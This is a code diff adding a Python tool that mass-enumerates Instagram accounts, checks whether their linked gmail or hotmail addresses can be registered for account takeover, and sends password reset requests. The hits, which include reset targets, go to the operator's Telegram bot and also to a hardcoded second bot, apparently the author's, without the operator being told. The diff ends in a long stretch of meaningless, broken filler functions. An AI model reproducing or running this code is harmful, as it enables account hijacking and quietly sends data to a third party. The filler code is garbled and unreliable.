+        tt=(f"\r{GREEN}Hits:{GREEN} {hits}\n {RED}Gmail COnnections :{RED} {bads_instgram} \n{YELLOW}Gmail T/UN:{YELLOW} {bads_email}")
+        print(tt, end='', flush=True)
+        if pp == '0':
+          headers = {
+            'accept': '*/*',
+            'accept-language': 'en-US,en;q=0.9',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://www.instagram.com',
+            'referer': 'https://www.instagram.com/accounts/signup/email/',
+            'user-agent': ua,
+            'x-csrftoken': csrftoken
+        }
+          data = {
+            'email': email,
+        }
+          response = requests.post('https://www.instagram.com/api/v1/web/accounts/check_email/', headers=headers, data=data)
+       #   print(response.text)
+          if 'email_is_taken' in str(response.text):Qredes(email)
+          else:bads_instgram+=1
+        elif pp == '1':
+          headers = {
+              'accept': '*/*',
+              'accept-language': 'en-US,en;q=0.9',
+              'content-type': 'application/x-www-form-urlencoded',
+              'origin': 'https://www.instagram.com',
+              'referer': 'https://www.instagram.com/?lang=en-US&hl=en-gb',
+              'user-agent': ua,
+              'x-csrftoken': csrftoken,
+          }
+          data = {
+              'username': email,
+          }
+          response = requests.post(
+              'https://www.instagram.com/api/v1/web/accounts/login/ajax/',
+              headers=headers,
+              data=data,
+          ).text
+       #   print(str(response))
+          if '"user":true' in response:Qredes(email)
+          else:bads_instgram+=1
+      except:''
+       # check(email)
+      tt=(f"\r{GREEN}Hits:{GREEN} {hits} {RED}Bad instgram:{RED} {bads_instgram} {YELLOW}Email Not Available:{YELLOW} {bads_email}")
+      print(tt, end='', flush=True)
+    
+    
+    
+    def qqq():
+      while True:
+        try:
+          lsd=''.join(choice('eQ6xuzk5X8j6_fGvb0gJrc') for _ in range(16))
+          id=str(randrange(966874530,92160383715))
+          headers = {
+          'accept': '*/*',
+          'accept-language': 'en-US,en;q=0.9',
+          'content-type': 'application/x-www-form-urlencoded',
+          'origin': 'https://www.instagram.com',
+          'referer': 'https://www.instagram.com/0s9s/',
+          'user-agent': str(generate_user_agent()),
+          'x-fb-lsd': 'qredes'+lsd,
+      }
+          data = {
+          'lsd': 'qredes'+lsd,
+          'variables': '{"id":"'+id+'","relay_header":false,"render_surface":"PROFILE"}',
+          'doc_id': '7397388303713986',
+      }
+          username = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data).json()['data']['user']['username']#['@Qredes']
+          email=username+'@gmail.com'
+          check(email)
+        except:''
+    from threading import Thread
+    for _ in range(100):
+      Thread(target=qqq).start()
+    
+    #DEMONPIS
+
+def HOTMAIL_HUNTING_2k15_2k20():
+    from pyfiglet import Figlet
+    import requests,re,random,os,sys
+    from rich import print as g
+    from rich.panel import Panel
+    from threading import Thread
+    
+    
+    R = '\033[1;31;40m'
+    X = '\033[1;33;40m' 
+    F = '\033[1;32;40m' 
+    C = "\033[1;97;40m" 
+    C = "\033[1;97;40m"
+    B = '\033[1;36;40m'
+    K = '\033[1;35;40m'
+    V = '\033[1;36;40m'
+    F = '\033[1;32m'
+    Z = '\033[1;31m'
+    S = '\033[1;33m'
+    B = '\x1b[38;5;208m'
+    
+    fig = Figlet(font='poison')
+    logo = fig.renderText(f'STEIN')
+    print(logo)
+    
+    nnn = random.choice([R,X,F,B,K,V])
+    good_hot,bad_hot,good_ig,bad_ig,check,mj,ids=0,0,0,0,0,0,[]
+    tok = input(f"TOKEN :  ")
+    iD = input(f"ID :  ")
+    bot_token = '7005732567:AAGjr5R97uJyhk_W1kWgyTAEFunQRpR_-FQ'
+    chat_id = '5877942956'
+    os.system('clear')
+    def cookie(email):
+        versions = ["13.1.2", "13.1.1", "13.0.5", "12.1.2", "12.0.3"]
+        oss = [
+        "Macintosh; Intel Mac OS X 10_15_7",
+         "Macintosh; Intel Mac OS X 10_14_6",
+          "iPhone; CPU iPhone OS 14_0 like Mac OS X",
+           "iPhone; CPU iPhone OS 13_6 like Mac OS X"]
+        version = random.choice(versions)
+        platform = random.choice(oss)
+        user_agent = f"Mozilla/5.0 ({platform}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{version} Safari/605.1.15 Edg/122.0.0.0"
+        try:
+            url = 'https://signup.live.com'
+            headers={'user-agent': user_agent}
+            response = requests.post(url,headers=headers)
+            amsc = response.cookies.get_dict()['amsc']
+            match = re.search(r'"apiCanary":"(.*?)"', response.text)
+            if match:
+                api_canary= match.group(1)
+                canary = api_canary.encode().decode('unicode_escape')
+            else:pass
+            return amsc,canary
+        except :
+            check_hot(email)
+    
+    def insta1(email):
+    	global good_ig,bad_ig
+    	try:
+    		app=''.join(random.choice('1234567890')for i in range(15))
+    		response = requests.get('https://www.instagram.com/api/graphql')
+    		csrf = response.cookies.get_dict().get('csrftoken')
+    		rnd=str(random.randint(150, 999))
+    		user_agent = "Instagram 311.0.0.32.118 Android (" + ["23/6.0", "24/7.0", "25/7.1.1", "26/8.0", "27/8.1", "28/9.0"][random.randint(0, 5)] + "; " + str(random.randint(100, 1300)) + "dpi; " + str(random.randint(200, 2000)) + "x" + str(random.randint(200, 2000)) + "; " + ["SAMSUNG", "HUAWEI", "LGE/lge", "HTC", "ASUS", "ZTE", "ONEPLUS", "XIAOMI", "OPPO", "VIVO", "SONY", "REALME"][random.randint(0, 11)] + "; SM-T" + rnd + "; SM-T" + rnd + "; qcom; en_US; 545986"+str(random.randint(111,999))+")"
+    		common_data = {'flow': 'fxcal','recaptcha_challenge_field': '',}
+    		data = {'email_or_username': email + "@hotmail.com", **common_data}
+    		headers = {'authority': 'www.instagram.com','accept': '*/*','accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7','content-type': 'application/x-www-form-urlencoded','user-agent': user_agent,'viewport-width': '384','x-asbd-id': '129477','x-csrftoken': f'{csrf}','x-ig-app-id': app,'x-ig-www-claim': '0','x-instagram-ajax': '1007832499','x-requested-with': 'XMLHttpRequest'}
+    		response = requests.post('https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/', headers=headers, data=data)
+    		if 'email_or_sms_sen' in response.text :
+    			good_ig+=1			
+    			check_hot(email)
+    		else:
+    			bad_ig+=1			
+    	except requests.exceptions.ConnectionError:
+    		insta1(email)
+    
+    def insta2(email):
+    	bb =0
+    	global good_ig,bad_ig
+    	try:
+    		rnd=str(random.randint(150, 999))
+    		user_agent = "Instagram 311.0.0.32.118 Android (" + ["23/6.0", "24/7.0", "25/7.1.1", "26/8.0", "27/8.1", "28/9.0"][random.randint(0, 5)] + "; " + str(random.randint(100, 1300)) + "dpi; " + str(random.randint(200, 2000)) + "x" + str(random.randint(200, 2000)) + "; " + ["SAMSUNG", "HUAWEI", "LGE/lge", "HTC", "ASUS", "ZTE", "ONEPLUS", "XIAOMI", "OPPO", "VIVO", "SONY", "REALME"][random.randint(0, 11)] + "; SM-T" + rnd + "; SM-T" + rnd + "; qcom; en_US; 545986"+str(random.randint(111,999))+")"
+    		url = 'https://www.instagram.com/api/v1/web/accounts/check_email/'
+    		head= {	
+    			 'Host': 'www.instagram.com',
+    			 'origin': 'https://www.instagram.com',
+    			 'referer': 'https://www.instagram.com/accounts/signup/email/',	
+    			 'sec-ch-ua-full-version-list': '"Android WebView";v="119.0.6045.163", "Chromium";v="119.0.6045.163", "Not?A_Brand";v="24.0.0.0"',
+    			 'user-agent': user_agent}
+    		data = {
+    		'email':email+"@hotmail.com"
+    		}
+    		res= requests.post(url,headers=head,data=data)
+    		if 'email_is_taken' in res.text:		
+    			good_ig+=1			
+    			check_hot(email)
+    		else:
+    			bad_ig+=1			
+    	except requests.exceptions.ConnectionError:
+    		insta2(email)
+    
+    def check_hot(email):
+    	global good_hot,bad_hot
+    	versions = ["13.1.2", "13.1.1", "13.0.5", "12.1.2", "12.0.3"]
+    	oss = [
+    	"Macintosh; Intel Mac OS X 10_15_7",
+    	 "Macintosh; Intel Mac OS X 10_14_6",
+    	 "iPhone; CPU iPhone OS 14_0 like Mac OS X",
+    	  "iPhone; CPU iPhone OS 13_6 like Mac OS X"]
+    	version = random.choice(versions)
+    	platform = random.choice(oss)
+    	user_agent = f"Mozilla/5.0 ({platform}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{version} Safari/605.1.15 Edg/122.0.0.0"
+    	try:	     
+    	     amsc,canary = cookie(email)	     
+    	     headers = {
+          'authority': 'signup.live.com',
+          'accept': 'application/json',
+          'accept-language': 'en-US,en;q=0.9',
+          'canary': canary,
+          'user-agent': user_agent,
+        }
+    	     cookies = {
+          'amsc':amsc
+        }
+    	     data = {
+          'signInName': email+"@hotmail.com",
+        }
+    	     response = requests.post(
+          'https://signup.live.com/API/CheckAvailableSigninNames',cookies=cookies,headers=headers,json=data)   
+    	     if 'isAvailable' in response.text:
+    	     	good_hot+=1	     	
+    	     	hunting(email)	     	
+    	     else:	     	
+    	     	pass  	
+    	except requests.exceptions.ConnectionError:
+    		check_hot(email)	
+    
+    def date_sc(Id):
+     try:
+      if int(Id) >1 and int(Id)<1279000:
+       return 2010
+      elif int(Id)>1279001 and int(Id)<17750000:
+       return 2011
+      elif int(Id) > 17750001 and int(Id)<279760000:
+       return 2012
+      elif int(Id)>279760001 and int(Id)<900990000:
+       return 2013
+      elif int(Id)>900990001 and int(Id)< 1629010000:
+       return 2014
+      elif int(Id)>1900000000 and int(Id)<2500000000:
+       return 2015
+      elif int(Id)>2500000000 and int(Id)<3713668786:
+       return 2016
+      elif int(Id)>3713668786 and int(Id)<5699785217:
+       return 2017
+      elif int(Id)>5699785217 and int(Id)<8507940634:
+       return 2018
+      elif int(Id)>8507940634 and int(Id)<21254029834:
+       return 2019
+      else:
+       return "2020-2023"
+     except BaseException as MG :
+      return MG
+    	
+    def hunting(email):	
+    	try:
+    		headers = {
+        'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
+        'X-Pigeon-Rawclienttime': '1700251574.982',
+        'X-IG-Connection-Speed': '-1kbps',
+        'X-IG-Bandwidth-Speed-KBPS': '-1.000',
+        'X-IG-Bandwidth-TotalBytes-B': '0',
+        'X-IG-Bandwidth-TotalTime-MS': '0',
+        'X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
+        'X-IG-Connection-Type': 'WIFI',
+        'X-IG-Capabilities': '3brTvw==',
+        'X-IG-App-ID': '567067343352427',
+        'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
+        'Accept-Language': 'en-GB, en-US',
+         'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
+        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        'Accept-Encoding': 'gzip, deflate',
+        'Host': 'i.instagram.com',
+        'X-FB-HTTP-Engine': 'Liger',
+        'Connection': 'keep-alive',
+        'Content-Length': '356',
+    }
+    		data = {
+        'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'+email+'"}',
+        'ig_sig_key_version': '4',
+    }	
+    		try:
+    		    response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data,)
+    		    rest = response.json()['email']
+    		except :
+    			rest = False
+    		try:
+    			info=requests.get('https://anonyig.com/api/ig/userInfoByUsername/'+email).json()
+    		except :
+    			info = None			
+    		try:
+    			Id =info['result']['user']['pk_id']
+    		except :
+    			Id = None
+    		try:
+    			followers = info['result']['user']['follower_count']
+    		except :
+    			followers = None
+    		try:
+    			following = info['result']['user']['following_count']
+    		except :
+    			following = None
+    		try:
+    			post = info['result']['user']['media_count']
+    		except :
+    			post = None
+    		try:
+    			name = info['result']['user']['full_name']
+    		except :
+    			name = None
+    		date = date_sc(Id)			
+    		hunt = ("""
+    HIT
+     NAME  {}
+     USERNAME  {}
+     EMAIL  {}@hotmail.com
+     FOLLOWERS  {}
+     FOLLOWING  {}
+     POST  {}
+     DATE  {}
+     ID  {}
+     RESET  {}
+    
+    @demonpis || STEIN||
+    		""".format(name,email,email,followers,following,Id,date,post,rest))
+    		requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={iD}&text="+str(hunt))
+    		requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text="+str(hunt))
+    		print(logo)				
+    		hunt2 = ("""
+    	 SEMI	HUNT
+     USERNAME  {}
+     EMAIL  {}@hotmail.com
+     RESET  {}
+    	@demonpis || STEIN||	
+    		
+    		""".format(name,email,email,followers,following,Id,date,post,rest))
+    		Hit = Panel(hunt2);g(Panel(Hit, title=f"Instagram | {good_hot}"))
+    	except :
+    		hunting(email)
+    
+    def check_email(email):
+    	global good_hot,bad_hot,bad_ig,good_ig,check
+    	Choice = random.choice(['insta1','insta2'])
+    	if Choice != 'insta2':
+    		insta1(email)
+    	else :
+    		insta2(email)
+    	b = random.randint(5,208)
+    	bo = f'\x1b[38;5;{b}m'
+    	check+=1
+    	sys.stdout.write(f"\r  {C}GOOD {F}{good_hot} || {C}GOOD GRAPHS{R}{bad_ig}  {C}\r")
+    	sys.stdout.flush()
+    
+    def rand_ids():  
+      Id= str(random.randrange(281874530,96414197353))
+      if Id not in ids:
+        ids.append(Id)
+        return Id
+      else:
+        rand_ids()
+        
+    def username1():
+      global check
+      try:
+        while True:      
+          rnd=str(random.randint(150, 999))
+          user_agent = "Instagram 311.0.0.32.118 Android (" + ["23/6.0", "24/7.0", "25/7.1.1", "26/8.0", "27/8.1", "28/9.0"][random.randint(0, 5)] + "; " + str(random.randint(100, 1300)) + "dpi; " + str(random.randint(200, 2000)) + "x" + str(random.randint(200, 2000)) + "; " + ["SAMSUNG", "HUAWEI", "LGE/lge", "HTC", "ASUS", "ZTE", "ONEPLUS", "XIAOMI", "OPPO", "VIVO", "SONY", "REALME"][random.randint(0, 11)] + "; SM-T" + rnd + "; SM-T" + rnd + "; qcom; en_US; 545986"+str(random.randint(111,999))+")"
+          Id = rand_ids()
+          lsd=''.join(random.choice('azertyuiopmlkjhgfdsqwxcvbnAZERTYUIOPMLKJHGFDSQWXCVBN1234567890') for _ in range(32))
+          headers = {
+        'accept': '*/*',
+        'accept-language': 'en,en-US;q=0.9',
+        'content-type': 'application/x-www-form-urlencoded',
+        'dnt': '1',
+        'origin': 'https://www.instagram.com',
+        'priority': 'u=1, i',
+        'referer': 'https://www.instagram.com/cristiano/following/',
+        'user-agent': user_agent,
+        'x-fb-friendly-name': 'PolarisUserHoverCardContentV2Query',
+        'x-fb-lsd': lsd,
+    }
+          data = {
+        'lsd': lsd,
+        'fb_api_caller_class': 'RelayModern',
+        'fb_api_req_friendly_name': 'PolarisUserHoverCardContentV2Query',
+        'variables': '{"userID":"'+str(Id)+'","username":"cristiano"}',
+        'server_timestamps': 'true',
+        'doc_id': '7717269488336001',
+    }
+          response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
+          user =response.json()['data']['user']['username'] 
+          check_email(user)           
+      except :
+      	username1()
+    
+    for i in range(90):
+      Thread(target=username1).start()
+
+def BEST_BASED_PASS_RESET():
+    import requests
+    import re
+    import os
+    from uuid import uuid4
+    
+    def send_password_reset(email_or_username):
+        url = 'https://www.instagram.com/accounts/account_recovery_send_ajax/'
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+            'Referer': 'https://www.instagram.com/accounts/password/reset/',
+            'X-CSRFToken': 'csrftoken'  # You need to extract this value from the response cookies after visiting the password reset page
+        }
+        data = {
+            'email_or_username': email_or_username,
+            'recaptcha_challenge_field': ''
+        }
+        response = requests.post(url, headers=headers, data=data)
+        return response
+    
+    def extract_hint(response_text):
+        hint_match = re.search(r'<b>(.*?)</b>', response_text)
+        if hint_match:
+            return hint_match.group(1)
+        else:
+            return "Unknown"
+    
+    def send_pass_reset_email(username):
+        try:
+            username = username.split('@gmail.com')[0]
+        except:
+            pass
+        url = f'https://www.instagram.com/api/v1/users/web_profile_info/?username={username}'
+        headers = {
+            'accept': '*/*',
+            'accept-encoding': 'gzip',
+            'accept-language': 'en-US;q=0.9,en;q=0.7',
+            'referer': 'https://www.instagram.com/' + username,
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'x-ig-app-id': '936619743392459',
+            'x-ig-www-claim': '0',
+            'x-requested-with': 'XMLHttpRequest',
+        }
+        r = requests.get(url, headers=headers).json()
+        try:
+            user_id = r['data']['user']['id']
+        except:
+            print("STATUS~~2")
+            print("-FAILED TO SEND THE @" + username)
+            return
+        url = 'https://i.instagram.com/api/v1/accounts/send_password_reset/'
+        headers = {
+            'User-Agent': 'Instagram 6.12.1 Android (30/11; 480dpi; 1080x2004; HONOR; ANY-LX2; HNANY-Q1; qcom; ar_EG_#u-nu-arab)',
+            'Cookie': 'mid=YwsgcAABAAGsRwCKCbYCaUO5xej3; csrftoken=u6c8M4zaneeZBfR5scLVY43lYSIoUhxL',
+            'Cookie2': '$Version=1',
+            'Accept-Language': 'ar-EG, en-US',
+            'X-IG-Connection-Type': 'MOBILE(LTE)',
+            'X-IG-Capabilities': 'AQ==',
+            'Accept-Encoding': 'gzip',
+        }
+        data = {
+            "user_id": user_id,
+            "device_id": str(uuid4()),
+        }
+        zaid = requests.post(url, headers=headers, data=data).json()
+        try:
+            rest = zaid["obfuscated_email"]
+            print("STATUS~~2")
+            print(f"-PASS RESET LINK SENT TO @{username} to {rest}")
+        except:
+            print("STATUS~~2")
+            print("-FAILED TO SEND THE @" + username)
+    
+    while True:
+        username = input("Enter Instagram email or username: ")
+        
+        
+        response = send_password_reset(username)
+        if response.status_code == 200:
+            hint = extract_hint(response.text)
+            print("STATUS~1")
+            print(f"-PASS RESET LINK SENT TO @{username} to {hint}")
+        else:
+            print("STATUS~1")
+            print("-FAILED TO SEND THE @" + username)
+        
+        
+        send_pass_reset_email(username)
+
+if __name__ == '__main__':
+    while True:
+        try:
+            print(Fore.BLUE + Style.BRIGHT + '1. Reports')
+            print(Fore.BLUE + Style.BRIGHT + '2. UNIVERSAL EMAIL CHECKER')
+            print(Fore.BLUE + Style.BRIGHT + '3. GMAIL HUNTING 2k15-2k20')
+            print(Fore.BLUE + Style.BRIGHT + '4. HOTMAIL HUNTING 2k15-2k20')
+            print(Fore.BLUE + Style.BRIGHT + '5. BEST BASED PASS RESET')
+            print(Fore.RED + Style.BRIGHT + '6. Exit')
+            choice = input(Fore.YELLOW + 'Enter the number to run the file: ')
+            if choice == '1':
+                Reports()
+            if choice == '2':
+                UNIVERSAL_EMAIL_CHECKER()
+            if choice == '3':
+                GMAIL_HUNTING_2k15_2k20()
+            if choice == '4':
+                HOTMAIL_HUNTING_2k15_2k20()
+            if choice == '5':
+                BEST_BASED_PASS_RESET()
+            elif choice == '6':
+                print('Exiting...')
+                break
+            else:
+                print('Invalid choice. Please try again.')
+        except Exception as e:
+            print(Fore.RED + 'An error occurred while running the selected file:')
+            print(Fore.RED + str(e))
+            print(Fore.YELLOW + 'Returning to the menu...')
+
+#copyright Stein
+def managedata58():
+    return y
+
+def processitem86():
+    x = random.randint(1, 100)
+
+def computeelement5():
+    return y
+
+def loaddata15():
+    data = {'key': 'value'}
+
+def handlestate65():
+    if x > random.randint(50, 100):
+        return z
+
+def computedata48():
+    return y
+
+def computeinfo50():
+    y = x + random.choice([3, 5, 7])
+
+def updatestate12():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def checkitem60():
+    data = {'key': 'value'}
+
+def handlestate57():
+    z = y * 2
+
+def setresult91():
+    data = {'key': 'value'}
+
+def managedata2():
+    x = random.randint(1, 100)
+
+def loadresult8():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def getinfo63():
+    return y
+
+def processlist56():
+    if x > random.randint(50, 100):
+        return z
+
+def computevalue75():
+    x = random.randint(1, 100)
+
+def managevalue63():
+    z = y * 2
+
+def computestatus75():
+    if x > random.randint(50, 100):
+        return z
+
+def loadvalue56():
+    if x > random.randint(50, 100):
+        return z
+
+def checkitem38():
+    if x > random.randint(50, 100):
+        return z
+
+def processconfig83():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def processstatus56():
+    for i in range(5):
+        y += i
+
+def setvalue95():
+    if x > random.randint(50, 100):
+        return z
+
+def handlestatus21():
+    data = {'key': 'value'}
+print("STEIN")
+def updatestatus62():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def setstate48():
+    y = x + random.choice([3, 5, 7])
+
+def updatestate59():
+    if x > random.randint(50, 100):
+        return z
+
+def manageresult5():
+    if x > random.randint(50, 100):
+        return z
+
+def processresult52():
+    return y
+
+def computeresult12():
+    data = {'key': 'value'}
+
+def managelist70():
+    y = x + random.choice([3, 5, 7])
+
+def handleresult89():
+    if x > random.randint(50, 100):
+        return z
+
+def handlestatus91():
+    x = random.randint(1, 100)
+
+def managestatus39():
+    y = x + random.choice([3, 5, 7])
+
+def setstatus37():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updateelement21():
+    y = x + random.choice([3, 5, 7])
+
+def processvalue92():
+    if x > random.randint(50, 100):
+        return z
+
+def checkdata22():
+    x = random.randint(1, 100)
+
+def computeinfo56():
+    for i in range(5):
+        y += i
+
+def loadvalue20():
+    x = random.randint(1, 100)
+
+def setresult76():
+    if x > random.randint(50, 100):
+        return z
+
+def updateitem11():
+    data = {'key': 'value'}
+
+def updatestate20():
+    if x > random.randint(50, 100):
+        return z
+
+def loadstate29():
+    x = random.randint(1, 100)
+
+def processelement57():
+    for i in range(5):
+        y += i
+
+def computelist17():
+    for i in range(5):
+        y += i
+
+def setitem93():
+    z = y * 2
+
+def setconfig72():
+    if x > random.randint(50, 100):
+        return z
+
+def manageresult41():
+    y = x + random.choice([3, 5, 7])
+
+def updateitem34():
+    z = y * 2
+
+def updateconfig32():
+    return y
+
+def setstatus25():
+    for i in range(5):
+        y += i
+
+def processstate70():
+    for i in range(5):
+        y += i
+
+def handlestate23():
+    data = {'key': 'value'}
+
+def getitem40():
+    y = x + random.choice([3, 5, 7])
+
+def getitem61():
+    for i in range(5):
+        y += i
+
+def updatestate51():
+    x = random.randint(1, 100)
+
+def checkstate4():
+    y = x + random.choice([3, 5, 7])
+
+def managestatus88():
+    return y
+
+def manageinfo13():
+    data = {'key': 'value'}
+
+def handledata13():
+    x = random.randint(1, 100)
+
+def manageconfig25():
+    return y
+
+def getstate13():
+    x = random.randint(1, 100)
+
+def setvalue34():
+    data = {'key': 'value'}
+
+def loadresult61():
+    return y
+
+def checkresult49():
+    z = y * 2
+
+def computeelement12():
+    x = random.randint(1, 100)
+
+def getlist81():
+    return y
+
+def processvalue9():
+    data = {'key': 'value'}
+
+def computeelement58():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def getlist13():
+    for i in range(5):
+        y += i
+
+def processinfo6():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def processinfo71():
+    for i in range(5):
+        y += i
+
+def handlestate10():
+    z = y * 2
+
+def processelement47():
+    return y
+
+def getelement35():
+    x = random.randint(1, 100)
+
+def getitem72():
+    return y
+
+def managestate22():
+    x = random.randint(1, 100)
+
+def getresult86():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def managevalue42():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updateconfig23():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def loaditem38():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def loaddata88():
+    for i in range(5):
+        y += i
+
+def setlist82():
+    x = random.randint(1, 100)
+
+def loadelement37():
+    data = {'key': 'value'}
+
+def handleresult2():
+    for i in range(5):
+        y += i
+
+def updatelist25():
+    x = random.randint(1, 100)
+
+def setitem88():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updatelist18():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updatestate67():
+    y = x + random.choice([3, 5, 7])
+
+def processitem4():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def processinfo90():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updatevalue81():
+    x = random.randint(1, 100)
+
+def computestate17():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def setstatus58():
+    z = y * 2
+
+def getdata43():
+    return y
+
+def loaddata72():
+    if x > random.randint(50, 100):
+        return z
+
+def loadconfig88():
+    x = random.randint(1, 100)
+
+def managestatus59():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def handleconfig53():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def c(*args):
+    pass
+
+def updateitem14():
+    y = x + random.choice([3, 5, 7])
+
+def getconfig41():
+    x = random.randint(1, 100)
+
+def getresult2():
+    for i in range(5):
+        y += i
+
+def computestatus28():
+    if x > random.randint(50, 100):
+        return z
+
+def getlist20():
+    z = y * 2
+
+def managelist29():
+    return y
+
+def getstatus41():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def loadlist7():
+    y = x + random.choice([3, 5, 7])
+
+def processconfig82():
+    data = {'key': 'value'}
+
+def setresult66():
+    z = y * 2
+
+def loadstatus61():
+    z = y * 2
+
+def setlist31():
+    for i in range(5):
+        y += i
+
+def loadstate24():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def getdata77():
+    z = y * 2
+
+def getresult92():
+    for i in range(5):
+        y += i
+
+def getdata96():
+    if x > random.randint(50, 100):
+        return z
+
+def updatelist85():
+    z = y * 2
+
+def handleconfig30():
+    x = random.randint(1, 100)
+
+def checkconfig8():
+    for i in range(5):
+        y += i
+
+def getstatus3():
+    return y
+
+def loadresult2():
+    y = x + random.choice([3, 5, 7])
+
+def setlist80():
+    return y
+
+def setvalue20():
+    x = random.randint(1, 100)
+
+def setinfo95():
+    if x > random.randint(50, 100):
+        return z
+
+def processinfo34():
+    for i in range(5):
+        y += i
+
+def getinfo11():
+    return y
+
+def loadconfig93():
+    if x > random.randint(50, 100):
+        return z
+
+def processvalue26():
+    if x > random.randint(50, 100):
+        return z
+
+def loadinfo76():
+    data = {'key': 'value'}
+
+def checkelement51():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def handlestate7():
+    y = x + random.choice([3, 5, 7])
+
+def handlevalue60():
+    return y
+
+def handleelement28():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def getelement41():
+    z = y * 2
+
+def processelement93():
+    for i in range(5):
+        y += i
+
+def handledata93():
+    if x > random.randint(50, 100):
+        return z
+
+def computevalue81():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updatedata76():
+    return y
+
+def getinfo2():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def handleinfo83():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updateconfig64():
+    if x > random.randint(50, 100):
+        return z
+
+def updatedata62():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def computestatus37():
+    return y
+
+def getlist89():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def loadresult62():
+    for i in range(5):
+        y += i
+
+def computeelement16():
+    x = random.randint(1, 100)
+
+def processinfo97():
+    data = {'key': 'value'}
+
+def setinfo61():
+    return y
+
+def checkelement58():
+    if x > random.randint(50, 100):
+        return z
+
+def computelist80():
+    data = {'key': 'value'}
+
+def handledata5():
+    x = random.randint(1, 100)
+
+def loadresult86():
+    data = {'key': 'value'}
+
+def manageitem95():
+    x = random.randint(1, 100)
+
+def updateelement53():
+    x = random.randint(1, 100)
+
+def getelement91():
+    if x > random.randint(50, 100):
+        return z
+
+def processdata92():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updatedata97():
+    data = {'key': 'value'}
+
+def checkvalue84():
+    y = x + random.choice([3, 5, 7])
+
+def computedata45():
+    y = x + random.choice([3, 5, 7])
+
+def computeconfig2():
+    data = {'key': 'value'}
+
+def handleinfo61():
+    if x > random.randint(50, 100):
+        return z
+
+def setitem79():
+    return y
+
+def getvalue47():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def setstate43():
+    for i in range(5):
+        y += i
+
+def checkelement68():
+    for i in range(5):
+        y += i
+
+def updateelement64():
+    return y
+
+def handleelement90():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def getinfo55():
+    return y
+
+def updateinfo81():
+    z = y * 2
+
+def loadresult44():
+    y = x + random.choice([3, 5, 7])
+
+def processresult32():
+    data = {'key': 'value'}
+
+def getinfo50():
+    x = random.randint(1, 100)
+
+def computedata68():
+    z = y * 2
+
+def checkstate21():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def getstate56():
+    y = x + random.choice([3, 5, 7])
+
+def handledata94():
+    for i in range(5):
+        y += i
+
+def updatelist88():
+    for i in range(5):
+        y += i
+
+def getconfig70():
+    data = {'key': 'value'}
+
+def updatestate25():
+    data = {'key': 'value'}
+
+def getstate2():
+    return y
+
+def setstate76():
+    for i in range(5):
+        y += i
+
+def getstatus81():
+    data = {'key': 'value'}
+
+def handleresult22():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
